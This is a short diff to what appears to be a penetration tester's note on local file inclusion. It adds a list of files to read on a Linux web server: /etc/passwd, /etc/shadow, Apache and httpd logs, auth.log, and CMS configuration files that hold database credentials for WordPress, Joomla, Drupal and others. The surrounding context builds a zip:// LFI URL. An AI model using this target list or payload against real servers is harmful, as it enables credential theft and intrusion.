@@ -54,3 +54,20 @@ const command = `http://${discoveredDomain}/index.php?file=zip://uploads/upload_
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+
+LINUX- /etc/passwd /etc/shadow /etc/issue /etc/group /etc/hostname
+
+/var/log/apache/access.log
+/var/log/apache2/access.log 
+/var/log/httpd/access_log 
+/var/log/apache/error.log 
+/var/log/apache2/error.log 
+/var/log/httpd/error_log 
+/var/log/messages 
+/var/log/cron.log 
+/var/log/auth.log
+
+/var/www/html/wp-config.php <-- Wordpress 
+/var/www/configuration.php <-- Joomla 
+/var/www/html/inc/header.inc.php <-- Dolphin /var/www/html/sites/default/settings.php <-- Drupal /var/www/configuration.php <-- Mambo 
+/var/www/config.php <-- PHP
